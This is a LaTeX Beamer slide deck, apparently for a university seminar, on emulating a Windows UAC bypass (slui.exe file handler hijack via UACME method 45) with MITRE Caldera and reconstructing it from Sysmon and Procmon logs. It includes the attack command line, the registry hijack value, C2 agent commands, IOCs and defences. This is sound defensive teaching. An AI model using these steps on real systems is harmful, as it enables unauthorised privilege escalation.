@@ -1,0 +1,275 @@
+\documentclass[10pt,aspectratio=169]{beamer}
+
+\usetheme{Madrid}
+\usecolortheme{seahorse}
+\useinnertheme{rectangles}
+\setbeamertemplate{navigation symbols}{}
+\usepackage{fontspec}
+\usepackage{xeCJK}
+\setmainfont{Heiti TC}
+\setsansfont{Heiti TC}
+\setCJKmainfont{Heiti TC}
+\setCJKsansfont{Heiti TC}
+\setCJKmonofont{Heiti TC}
+
+\usepackage{booktabs}
+\usepackage{tikz}
+\usetikzlibrary{shapes.geometric, arrows.meta, positioning}
+\usepackage{listings}
+\usepackage{xcolor}
+
+\definecolor{codebg}{RGB}{40,42,54}
+\definecolor{codefg}{RGB}{248,248,242}
+\definecolor{codekey}{RGB}{255,121,198}
+\definecolor{codestr}{RGB}{241,250,140}
+
+\lstdefinestyle{dark}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\scriptsize\color{codefg},
+  keywordstyle=\color{codekey},
+  stringstyle=\color{codestr},
+  breaklines=true,
+  showstringspaces=false,
+  frame=none,
+  columns=fullflexible,
+}
+\lstset{style=dark}
+
+\title{MITRE Caldera 攻擊模擬與日誌分析}
+\subtitle{T1548.002 - Slui File Handler Hijack}
+\author{趙子佾}
+\date{2026 年 4 月}
+\institute{NTU Seminar}
+
+\begin{document}
+
+\maketitle
+
+% ------------------------------------------------------------
+\begin{frame}{實驗環境架構}
+\begin{table}
+\centering
+\begin{tabular}{@{}lll@{}}
+\toprule
+角色 & 系統 & 說明 \\
+\midrule
+Caldera Server & Linux & 攻擊控制中心，執行 C2 Server \\
+Windows Agent  & Windows 10/11 & 目標端點，部署 Sandcat Agent \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\vspace{1em}
+\textbf{網路拓樸}：兩台機器位於同一網段
+\begin{itemize}
+  \item Caldera Server IP：\texttt{10.1.106.114}
+  \item Windows Agent IP：\texttt{10.1.106.161}
+  \item C2 通訊 Port：\texttt{8888} (HTTP)
+\end{itemize}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{MITRE Caldera 介紹}
+\begin{itemize}
+  \item 基於 \textbf{MITRE ATT\&CK} 框架的自動化紅隊攻擊模擬平台
+  \item 架構分為兩個部分：
+  \begin{itemize}
+    \item \textbf{Server}：C2 伺服器，提供 Web UI 與 REST API，負責下發指令
+    \item \textbf{Agent (Sandcat)}：部署在目標機器，接收並執行攻擊指令
+  \end{itemize}
+  \item 支援 ATT\&CK TTP (Tactics, Techniques, Procedures) 自動化執行
+  \item 可透過 Adversary Profile 組合多個 Ability，模擬真實攻擊鏈
+\end{itemize}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{攻擊技術說明 T1548.002}
+\begin{itemize}
+  \item \textbf{技術名稱}：Abuse Elevation Control Mechanism - Bypass User Account Control
+  \item \textbf{子技術}：Slui File Handler Hijack
+  \item \textbf{原理}：
+  \begin{itemize}
+    \item 利用 \texttt{slui.exe} 在啟動時會讀取 \texttt{HKCU\textbackslash Software\textbackslash Classes\textbackslash exefile} File Handler 的特性
+    \item 由於 \texttt{slui.exe} 具有 \texttt{autoElevate=true} 屬性，以 High Integrity 執行
+    \item 透過 Hijack Registry，使其以高權限執行任意程式
+    \item 從 Medium Integrity $\rightarrow$ High Integrity，\textbf{不需使用者互動}
+  \end{itemize}
+  \item \textbf{工具}：UACME (\texttt{Akagi64.exe}) Method 45
+\end{itemize}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{攻擊執行流程}
+\centering
+\begin{tikzpicture}[
+  node distance=0.5cm and 0.8cm,
+  box/.style={rectangle, rounded corners, draw=white, fill=blue!60!black,
+              text=white, minimum width=4.5cm, minimum height=0.7cm, font=\small},
+  hbox/.style={rectangle, rounded corners, draw=white, fill=red!70!black,
+               text=white, minimum width=4.5cm, minimum height=0.7cm, font=\small},
+  arr/.style={-{Stealth[length=2.5mm]}, thick, draw=white!60!black}
+]
+\node[box] (s)  {Caldera Server};
+\node[box, below=of s]  (a)  {Sandcat Agent (splunkd.exe, Medium)};
+\node[box, below=of a]  (p)  {powershell.exe (Medium)};
+\node[box, below=of p]  (k)  {Akagi64.exe (Medium)};
+\node[hbox, below=of k] (sl) {slui.exe (\textbf{High})};
+\node[hbox, below=of sl] (c) {cmd.exe (\textbf{High}) $\leftarrow$ 攻擊成功};
+
+\draw[arr] (s) -- node[right, font=\scriptsize]{下發指令 + Akagi64.exe} (a);
+\draw[arr] (a) -- (p);
+\draw[arr] (p) -- (k);
+\draw[arr] (k) -- node[right, font=\scriptsize]{UAC Bypass} (sl);
+\draw[arr] (sl) -- (c);
+\end{tikzpicture}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Sysmon 日誌分析 - 攻擊鏈還原}
+從 Sysmon Event ID 1 (Process Create) 還原完整攻擊鏈：
+\begin{table}
+\centering
+\small
+\begin{tabular}{@{}llll@{}}
+\toprule
+時間 & Process & IntegrityLevel & Parent \\
+\midrule
+12:27:53 & powershell.exe  & Medium & splunkd.exe \\
+12:27:54 & Akagi64.exe     & Medium & powershell.exe \\
+12:27:54 & slui.exe        & \textbf{High} & Akagi64.exe \\
+12:27:54 & slui.exe 0x03   & \textbf{High} & slui.exe \\
+12:27:54 & cmd.exe         & \textbf{High} & slui.exe \\
+12:27:59 & Akagi64.exe     & - & Event ID 5 (終止) \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\vspace{0.5em}
+\textbf{重點}：IntegrityLevel 從 \textcolor{red!70!black}{\textbf{Medium} $\rightarrow$ \textbf{High}} 代表 UAC Bypass 成功
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Sysmon 關鍵證據 (1/2)}
+\textbf{攻擊來源 (Agent 偽裝為 Splunk)：}
+\begin{lstlisting}
+Image: C:\Users\Public\splunkd.exe
+CommandLine: splunkd.exe -server http://10.1.106.114:8888 -group red
+User: caldera-agent\caldera
+\end{lstlisting}
+
+\textbf{UAC Bypass 執行：}
+\begin{lstlisting}
+Image: C:\Users\Public\Akagi64.exe
+CommandLine: Akagi64.exe 45 C:\Windows\System32\cmd.exe
+Description: UACMe main module
+Product: UACMe   Company: Hazardous Environments
+IntegrityLevel: Medium
+\end{lstlisting}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Sysmon 關鍵證據 (2/2)}
+\textbf{最終結果 (High Integrity Shell)：}
+\begin{lstlisting}
+Image: C:\Windows\System32\cmd.exe
+ParentImage: C:\Windows\System32\slui.exe
+ParentCommandLine: "C:\WINDOWS\system32\slui.exe" 0x03
+IntegrityLevel: High
+User: caldera-agent\caldera
+\end{lstlisting}
+
+\begin{alertblock}{偵測要點}
+\begin{itemize}
+  \item \texttt{slui.exe} 通常不應作為 \texttt{cmd.exe} 的父行程
+  \item \texttt{splunkd.exe} 位於 \texttt{C:\textbackslash Users\textbackslash Public\textbackslash} 為異常路徑
+  \item 父子鏈 \texttt{splunkd.exe $\rightarrow$ powershell.exe $\rightarrow$ Akagi64.exe} 為高度可疑
+\end{itemize}
+\end{alertblock}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Hash 與 IOC}
+可作為威脅情報指標 (Indicators of Compromise)：
+\begin{table}
+\centering
+\scriptsize
+\begin{tabular}{@{}lll@{}}
+\toprule
+檔案 & MD5 & SHA256 (前 32 字元) \\
+\midrule
+Akagi64.exe & CA3FE69BFDBD536856BF36BBB8C949D4 & 9556E16A8D2B003DA04EC9A8973E038D\ldots \\
+cmd.exe     & 77F0062F490BCC7023763A422E561945 & 14CC8AB1DCF0D9F19E8FB82DEB547CF8\ldots \\
+slui.exe    & CF0A69B5DA75D171E5BFAE9CEC695F8C & BAE2B3360B3493027FA43B6E942D3C37\ldots \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\vspace{1em}
+\textbf{網路 IOC：}
+\begin{itemize}
+  \item C2 Server：\texttt{http://10.1.106.114:8888}
+  \item 可疑檔案路徑：\texttt{C:\textbackslash Users\textbackslash Public\textbackslash \{splunkd,sandcat.go-windows,Akagi64\}.exe}
+\end{itemize}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Procmon 輔助分析 - Registry Hijack}
+Procmon 補充 Sysmon 所看不到的 Registry 操作，揭露 Method 45 核心手法：
+\begin{lstlisting}
+01:09:44.952  Akagi64.exe  RegCreateKey
+   HKCU\Software\Classes\exefile\shell\open\command
+   Disposition: REG_OPENED_EXISTING_KEY
+
+01:09:44.953  Akagi64.exe  RegSetValue
+   HKCU\Software\Classes\exefile\shell\open\command\(Default)
+   Type: REG_SZ   Data: C:\Windows\System32\cmd.exe
+
+01:09:44.958  Akagi64.exe  QueryDirectory
+   C:\Windows\System32\slui.exe
+\end{lstlisting}
+
+\textbf{手法說明}：攻擊者將 \texttt{exefile} 的 shell open command 改寫為 \texttt{cmd.exe}，
+接著觸發具有 \texttt{autoElevate} 屬性的 \texttt{slui.exe}，
+由其以 High Integrity 啟動被劫持的 \texttt{cmd.exe}。
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{防禦建議}
+\begin{table}
+\centering
+\small
+\begin{tabular}{@{}ll@{}}
+\toprule
+防禦措施 & 說明 \\
+\midrule
+啟用 Sysmon              & 記錄 Process 建立、Registry 修改等事件 \\
+監控 IntegrityLevel 變化 & Medium $\rightarrow$ High 為異常提權跡象 \\
+監控 HKCU Classes 變更   & \texttt{exefile\textbackslash shell\textbackslash open\textbackslash command} 被寫入即為攻擊 \\
+限制 slui.exe 執行權限   & 避免被用於 UAC Bypass \\
+開啟 Tamper Protection   & 防止攻擊者關閉 Defender \\
+監控異常 Process 父子關係 & \texttt{splunkd.exe} 不應建立 \texttt{powershell.exe} \\
+UAC 設定拉至最高         & Always Notify 模式可阻擋大多數 auto-elevate bypass \\
+\bottomrule
+\end{tabular}
+\end{table}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{結論}
+\begin{itemize}
+  \item 成功使用 MITRE Caldera 模擬 \textbf{T1548.002} Slui File Handler Hijack 攻擊
+  \item Sysmon 完整記錄從 Agent 啟動到 UAC Bypass 的完整攻擊鏈
+  \item 攻擊者使用 \texttt{splunkd.exe} 偽裝成合法程式，並透過 \texttt{Akagi64.exe} 執行 Method 45 繞過 UAC
+  \item Procmon 補足 Registry 層級證據：\texttt{HKCU\textbackslash Software\textbackslash Classes\textbackslash exefile\textbackslash shell\textbackslash open\textbackslash command} 被劫持
+  \item \textbf{IntegrityLevel 從 Medium 提升至 High} 是關鍵偵測指標
+  \item 透過分層防禦 (Process 監控 + Registry 監控 + UAC 強化) 可有效偵測與阻擋此類攻擊
+\end{itemize}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[standout]
+Thank You\\[0.5em]
+\large Q \& A
+\end{frame}
+
+\end{document}
